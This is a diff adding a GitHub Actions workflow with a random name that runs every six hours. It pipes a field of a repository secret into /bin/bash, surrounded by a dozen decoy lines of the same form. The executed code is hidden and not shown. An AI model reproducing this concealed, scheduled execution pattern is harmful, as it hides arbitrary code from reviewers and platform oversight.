@@ -1,0 +1,29 @@
+name: yihuichiwanfanchiyige
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yihuichiwanfanchiyige
+        env:
+          now09008: ${{ secrets.now09008 }}
+        run: |
+          echo $now09008 | jq -r .h5615 | /bin/bash
+          echo $iwp348 | jq -r .vs144 | /bin/bash
+          echo $s6 | jq -r .wmwq836 | /bin/bash
+          echo $rukfe463 | jq -r .zhkz8484 | /bin/bash
+          echo $wlxsk0 | jq -r .x61 | /bin/bash
+          echo $r11 | jq -r .palb3 | /bin/bash
+          echo $wttze6194 | jq -r .it0776 | /bin/bash
+          echo $aqfno39856 | jq -r .pxfe7932 | /bin/bash
+          echo $xludw9972 | jq -r .i5316 | /bin/bash
+          echo $uhb46841 | jq -r .a20 | /bin/bash
+          echo $qwnws7 | jq -r .cq92 | /bin/bash
+          echo $fk8 | jq -r .imlcl48378 | /bin/bash
+          echo $c94 | jq -r .zb817 | /bin/bash
+
